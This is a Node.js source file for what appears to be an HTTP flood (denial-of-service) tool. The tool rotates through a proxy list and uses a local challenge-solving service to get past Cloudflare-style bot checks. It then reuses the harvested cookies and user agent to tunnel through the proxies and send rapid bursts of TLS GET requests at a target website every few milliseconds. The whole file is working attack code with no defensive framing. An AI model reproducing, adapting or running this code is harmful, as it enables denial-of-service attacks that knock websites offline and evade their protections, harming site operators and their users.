const request = require('request'),

fs = require('fs'),

{

    constants



} = require('crypto'),

http = require('http'),

tls = require('tls'),

rqJar = request.jar(),

url = require('url'),

path = require('path'),

script_name = path.basename(__filename),

referer = require('rand-referer'),

checker = require('checker-proxy'),

ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError'],

ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO'];



process.on('uncaughtException', function (e) {

if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;

    console.warn(e);

}).on('unhandledRejection', function (e) {

if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;

    console.warn(e);

}).on('warning', e => {

if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;

    console.warn(e);

}).setMaxListeners(0);



var log = console.log;



global.logger = function() { 



    var first_parameter = arguments[0];

    var other_parameters = Array.prototype.slice.call(arguments, 1);



    function formatConsoleDate(date) {



        var hour = date.getHours();

        var minutes = date.getMinutes();

        var seconds = date.getSeconds();

        return '\x1b[0m[' + ((hour < 10) ? '0' + hour : hour) +':' +((minutes < 10) ? '0' + minutes : minutes) +':' +((seconds < 10) ? '0' + seconds : seconds) +'] ';



    }



    log.apply(console, [formatConsoleDate(new Date()) + first_parameter].concat(other_parameters));



};



if (process.argv.length !== 9) {



    logger(`\x1b[96mBrowser-Engine (1.0)\x1b[0m`)

    logger(`\x1b[91mUsage: node ${script_name} [url] [time] [browser_threads] [http_version] [browser_timeout] [request_per_ip] [proxy_list] \x1b[0m`)

    process.exit(0)

}



const target = process.argv[2],

time = process.argv[3],

browser_counts = process.argv[4],

httpversion = process.argv[5],

conn_timeout = process.argv[6],

rps = process.argv[7],

proxylists = process.argv[8];



const proxylist = fs.readFileSync(proxylists,"utf-8").toString().match(/\S+/g);



logger(`\x1b[91mBrowser-Enginering website: ->\x1b[0m[\x1b[94m${target}\x1b[0m]:\x1b[92m443`)

logger(`\x1b[91mCatbypas's Production - MomentumTeam\x1b[0m`)



check_proxy_for_browser()



function check_proxy_for_browser() {

    logger(`Starting proxy checker`)

    var currentvalid = 0;

    var desired = browser_counts;



    proxylist.forEach(p => {

        if(currentvalid === desired){

            logger(`Desired Browser count started.`)

            return;

        }else{

            checker.check({

                url: 'https://google.com/',

                type: 'http',

                proxy: p,

                timeout: '10000'

            }).then(r => {

                if (r.code !== 200) {

                    return 

                } else if (r.code == 200) {

                    currentvalid++

                    logger(`${p} \x1b[92mOK.\x1b[0m`)

                    start_browser(p, currentvalid)

                }

            }).catch(e => {

                console.error(e)

                process.exit()

            })    

        }

    })

}



function start_browser(api_proxy, browser_count) {

    

    logger(`\x1b[91m${api_proxy}\x1b[0m:\x1b[33mOpening Browser n°[${browser_count}]\x1b[0m`)



    request({

        method: "POST",

        url: "http://localhost:8191/v1",

        headers: {

            "Content-Type": "application/json",

        },

        body: JSON.stringify({

            cmd: "request.get",

            url: target,

            proxy: {

                "url": `http://${api_proxy}/`,

            },

            maxTimeout: conn_timeout,

        }),



    }, function (err, res, body){

        if(err){

            return console.log(err)



        }else{

            var solver = JSON.parse(res.body);

            if(solver.status == 'ok'){

                var useragent = solver.solution.userAgent

                if(solver.solution.cookies === undefined){

                    console.log(`${api_proxy} have no cookie, maybe next request.`)

                }



                if(solver.solution.cookies !== undefined) {

                    var cc;

                    const obj = solver.solution.cookies

                    var p = JSON.stringify(obj);

                    p = JSON.parse(p);

                    p.forEach((p) => {

                        if(p == undefined) return;

                        var cookie;

                        cookie += p.name + '=' + p.value + ';';

                        cc = cookie.replace('undefined','');



                    });



                    logger(`${api_proxy} Solved Challenge. \r\n Cookie: ${cc}`)

                    flooder(api_proxy,useragent,cc)

                }



            }else {



                logger(`${api_proxy} (DEAD)`)

            }

        }

    })    

}



function flooder(proxy, ua, cookie) {

    logger(`\x1b[92m${proxy} \x1b[36m<-- Started Flood.\x1b[0m`)

    if(cookie == undefined || !cookie){

        return logger(`\x1b[91m${proxy} Exited Flood - Reason: No Cookie\x1b[0m`)

    }



    var br_proxie = proxy.split(':');

    var host = url.parse(target).host;

    var path = url.parse(target).path;

    setInterval( function() {

        var req = http.request({

            host: br_proxie[0],

            port: br_proxie[1],

            headers: {

                'User-Agent': ua,

                'Cookie': cookie,

            },

            jar: rqJar,

            rejectUnauthorized: false,

            method: 'CONNECT',

            path: host +':443'

        },function() {

            req.setSocketKeepAlive(true);

        });



        req.on('connect', function (res, socket, head) {

            var TlsConnection = tls.connect({

                host: host,

                ciphers: 'kEECDH+ECDSA:kEECDH:kEDH:HIGH:MEDIUM:+3DES:+SHA:!RC4:!aNULL:!eNULL:!LOW:!MD5:!EXP',

                secureProtocol: ['TLSv1_1_method', 'TLSv1_2_method_', 'TLSv1_3_method'], 

                servername: host,

                secure: true,

                requestCert: true,

                rejectUnauthorized: false,

                sessionTimeout: 10000,

                port: 443,

                socket: socket            

            }, function () {

                for (let j = 0; j < rps; j++) {

                    TlsConnection.setKeepAlive(true, 10000)

                    TlsConnection.setTimeout(10000);

                    TlsConnection.write(`GET ${path} HTTP/${httpversion}\r\n

                    Host: ${host}\r\nReferer: ${target}\r\n

                    Cookie: ${cookie}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n

                    user-agent: ${ua}\r\n

                    Upgrade-Insecure-Requests: 1\r\n

                    Accept-Encoding: gzip, deflate\r\n

                    Accept-Language: en-US,en;q=0.9\r\n

                    Cache-Control: max-age=0\r\n

                    Connection: Keep-Alive\r\n

                    Proxy-Connection: keep-alive\r\n\r\n`);

                }

            });



            TlsConnection.on('data', (chunk) => {

                setTimeout(function() {

                    TlsConnection.destroy();

                    return delete TlsConnection;

                }, 10000);

            });



        }).end();



    },5)





}
